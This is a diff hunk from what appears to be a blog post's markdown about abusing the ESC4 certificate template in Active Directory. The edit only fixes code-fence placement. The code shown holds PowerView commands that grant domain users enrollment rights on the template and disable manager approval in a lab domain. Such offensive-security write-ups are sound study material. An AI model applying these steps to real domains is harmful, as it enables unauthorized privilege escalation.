@@ -366,8 +366,9 @@ Well in this case we can't work with Certify ~~or Certipy~~ (see below update) a
 ```
 # Give users enrollment rights  
 Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domänen-Benutzer" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mcafeelab,DC=local" -Verbose  
+```
 <img src="/images/2022-09-16/esc4_enrollset.png">  
-
+```
 # Disable manager approval
 Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose
 
